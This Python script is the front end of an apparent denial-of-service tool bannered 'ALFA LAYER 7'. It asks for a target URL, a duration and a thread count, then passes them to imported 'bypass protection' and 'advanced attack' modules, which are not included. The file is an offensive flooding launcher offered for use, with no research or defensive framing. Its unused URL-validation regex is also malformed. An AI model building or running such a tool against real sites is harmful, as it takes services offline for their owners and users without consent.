import random
import time
import requests
from rich.console import Console
import pyfiglet
import re
import importlib
import os

# Dynamically import the other Python files in the same directory
def import_file(file_name):
    file_name_without_extension = file_name.split('.')[0]
    try:
        module = importlib.import_module(file_name_without_extension)
        return module
    except ModuleNotFoundError as e:
        print(f"Error: Could not import {file_name}: {e}")
        return None

# Import all necessary attack files from the same directory
bypass_protection = import_file('bypass_protection.py')
advanced_attack = import_file('advanced_attack.py')
additional_attack = import_file('additional_attack.py')

# Function to validate URL
def is_valid_url(url: str) -> bool:
    regex = re.compile(
        r'^(?:http|ftp)s?://' 
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' 
        r'localhost|' 
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|' 
        r'?[A-F0-9]*:[A-F0-9:]+?)' 
        r'(?::\d+)?' 
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

# Function to simulate delay between requests
def simulate_delay():
    delay = random.uniform(0.1, 0.5)  # Random delay between 0.1 to 0.5 seconds
    time.sleep(delay)

console = Console()

# Banner for the tool
banner = pyfiglet.figlet_format("ALFA LAYER 7")
console.print(f"[bold red]{banner}[/bold red]")

# User Input for attack details
url = console.input("[red]│   └───URL: [/red]")
time_duration = console.input("[red]│   ├───TIME: [/red]")
threads = console.input("[red]│   ├───THREADS: [/red]")

# Final Output
console.print("\n[red]Executing Attack...[/red]\n")
console.print(f"[red]URL: {url}[/red]")

# Ensure that the imported files are available before using them
if bypass_protection:
    console.print("[red]Bypassing Protection...[/red]")
    bypass_protection.send_sophisticated_request(url, int(threads), int(time_duration))

if advanced_attack:
    console.print("[red]Executing Advanced Attack...[/red]")
    advanced_attack.advanced_attack_method(url, int(threads), int(time_duration))

if additional_attack:
    console.print("[red]Executing Additional Attack...[/red]")
    additional_attack.additional_attack_method(url, int(threads), int(time_duration))
